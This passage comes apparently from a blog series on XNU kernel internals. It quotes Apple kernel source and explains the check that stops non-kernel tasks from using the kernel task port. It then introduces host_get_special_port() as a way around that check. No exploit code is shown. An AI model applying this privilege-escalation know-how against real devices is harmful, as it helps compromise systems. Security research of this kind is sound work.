    &lt;span class=&quot;mi&quot;&gt;1546&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1547&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1548&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1549&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 				&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exec_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1550&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1551&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;n&quot;&gt;task_reference_internal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1552&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1553&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1554&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;n&quot;&gt;ip_unlock&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1555&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1556&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1557&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1558&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1559&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This is where the check happens. The victim is the task on which operation is being performed and the caller is the one calling the function. The first check assumes if the caller is the kernel, and returns success if so. The second check is whether the caller is the same as the victim, which should be fine as a task should be able to perform operations on itself. The third check is where it makes a difference, if you make a change to the &lt;strong&gt;kernel_task&lt;/strong&gt; and you are not &lt;strong&gt;kernel_task&lt;/strong&gt; yourself, then the check will fail. However, this is just a pointer check with the &lt;strong&gt;kernel_task&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;kern&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_tt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1369&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kern_return_t&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1370&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_conversion_eval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;caller&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1371&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1372&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;cm&quot;&gt;/*
    1373: 	 * Tasks are allowed to resolve their own task ports, and the kernel is
    1374: 	 * allowed to resolve anyone's task port.
    1375: 	 */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1376&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;caller&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1377&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1378&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1379&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1380&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;caller&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1381&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1382&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1383&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1384&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;cm&quot;&gt;/*
    1385: 	 * Only the kernel can can resolve the kernel's task port. We've established
    1386: 	 * by this point that the caller is not kernel_task.
    1387: 	 */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1388&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TASK_NULL&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kernel_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1389&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_INVALID_SECURITY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1390&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1391&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1392&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CONFIG_EMBEDDED&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1393&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;cm&quot;&gt;/*
    1394: 	 * On embedded platforms, only a platform binary can resolve the task port
    1395: 	 * of another platform binary.
    1396: 	 */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1397&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;victim&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TF_PLATFORM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;caller&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t_flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TF_PLATFORM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1398&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SECURE_KERNEL&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1399&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_INVALID_SECURITY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1400&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1401&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cs_relax_platform_task_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1402&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1403&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1404&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 			&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_INVALID_SECURITY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1405&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 		&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1406&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* SECURE_KERNEL */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1407&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1408&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endif&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* CONFIG_EMBEDDED */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1409&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;1410&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KERN_SUCCESS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1411&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;1412&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;So while the kernel task is still obtained, you won’t be able to call the Mach APIs on it since it goes through the conversion APIs which will return &lt;strong&gt;KERN_INVALID_SECURITY&lt;/strong&gt; and the previous function will return a &lt;strong&gt;TASK_NULL&lt;/strong&gt;. There is another check by the way, which is that on embedded platforms, the code checks for the &lt;strong&gt;TF_PLATFORM&lt;/strong&gt; flag in the code signature, which is nothing but the &lt;strong&gt;platform-application&lt;/strong&gt; entitlement, which means that a caller without this entitlement cannot perform an operation on the victim that has this entitlement. We will discuss this in Part 3 of this series.&lt;/p&gt;

&lt;p&gt;Hence, one of the more recent techniques has been to use the &lt;strong&gt;host_get_special_port()&lt;/strong&gt; function. To understand this, head over to the file &lt;strong&gt;osfmk/mach/host_special_ports.h&lt;/strong&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BUILD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EXPORT_HDRS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mach&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host_special_ports&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mo&quot;&gt;067&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    068:  * Cannot be set or gotten from user space
    069:  */&lt;/span&gt;
    &lt;span class=&quot;mo&quot;&gt;070&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_SECURITY_PORT&lt;/span&gt;               &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
    &lt;span class=&quot;mo&quot;&gt;071&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mo&quot;&gt;072&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MIN_SPECIAL_PORT&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;HOST_SECURITY_PORT&lt;/span&gt;
    &lt;span class=&quot;mo&quot;&gt;073&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mo&quot;&gt;074&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    075:  * Always provided by kernel (cannot be set from user-space).
    076:  */&lt;/span&gt;
    &lt;span class=&quot;mo&quot;&gt;077&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_PORT&lt;/span&gt;                        &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
    &lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_PRIV_PORT&lt;/span&gt;                   &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
    &lt;span class=&quot;mo&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_IO_MASTER_PORT&lt;/span&gt;              &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;080&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;     &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* room to grow */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;081&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;082&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_LAST_SPECIAL_KERNEL_PORT&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;HOST_IO_MASTER_PORT&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;083&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;084&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    085:  * Not provided by kernel
    086:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;087&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_DYNAMIC_PAGER_PORT&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;088&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_AUDIT_CONTROL_PORT&lt;/span&gt;         &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;089&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_USER_NOTIFICATION_PORT&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;090&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_AUTOMOUNTD_PORT&lt;/span&gt;            &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;091&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_LOCKD_PORT&lt;/span&gt;                 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;092&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_KTRACE_BACKGROUND_PORT&lt;/span&gt;     &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;093&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_SEATBELT_PORT&lt;/span&gt;              &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;094&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_KEXTD_PORT&lt;/span&gt;                 &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;095&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_LAUNCHCTL_PORT&lt;/span&gt;             &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HOST_MAX_SPECIAL_KERNEL_PORT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
